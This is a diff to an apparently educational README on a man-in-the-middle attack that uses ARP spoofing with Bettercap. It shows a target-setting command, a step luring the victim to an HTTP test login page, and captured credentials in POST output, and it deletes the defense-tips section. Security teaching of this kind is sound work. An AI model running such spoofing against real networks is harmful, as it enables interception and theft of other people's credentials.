@@ -45,7 +45,6 @@ MITM Attack using ARP Spoofing with Bettercap (Educational Purpose Only)
     ```bash
     set arp.spoof.targets 192.168.94.171
     ```
-<img width="297" height="253" alt="image" src="https://github.com/user-attachments/assets/6197d53e-a076-439b-ba9a-9c76d4194301" />
 
 4. **Launch Attack:**
     ```bash
@@ -55,20 +54,16 @@ MITM Attack using ARP Spoofing with Bettercap (Educational Purpose Only)
     ```
 
 5. **Ask victim to visit:**
+   ### use http website...
+   **Example:**
     ```
     http://testphp.vulnweb.com/login.php
     ```
 
-6. **Captured Output:**
+7. **Captured Output:**
     ```
     POST /userinfo.php uname=loc&pass=mor
     ```
-
-## ⚠️ Defense Tips
-- Use HTTPS
-- Monitor ARP table
-- Use encrypted login pages
-
 ---
 
 ## 📄 License
